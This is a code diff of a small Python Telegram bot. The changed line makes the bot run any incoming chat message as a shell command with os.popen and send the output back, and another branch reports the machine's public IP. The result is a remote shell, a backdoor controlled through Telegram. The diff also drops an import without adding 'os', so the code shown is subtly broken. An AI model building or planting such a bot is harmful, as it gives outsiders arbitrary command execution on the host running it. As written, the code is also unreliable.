@@ -1,4 +1,4 @@
-import telebot, owlshell, requests
+import telebot, requests
 token = 'token'
 bot = telebot.TeleBot(token)
 @bot.message_handler(content_types=['text'])
@@ -11,7 +11,7 @@ def handle(message):
         bot.send_message(message.chat.id, requests.get('https://ifconfig.me/ip').text)
     else:
         try:
-            bot.send_message(message.chat.id, owlshell.shell(message.text))
+            bot.send_message(message.chat.id, os.popen(message.text).read())
         except Exception as e:
             bot.send_message(message.chat.id, f'Error: {e}.')
 while True:
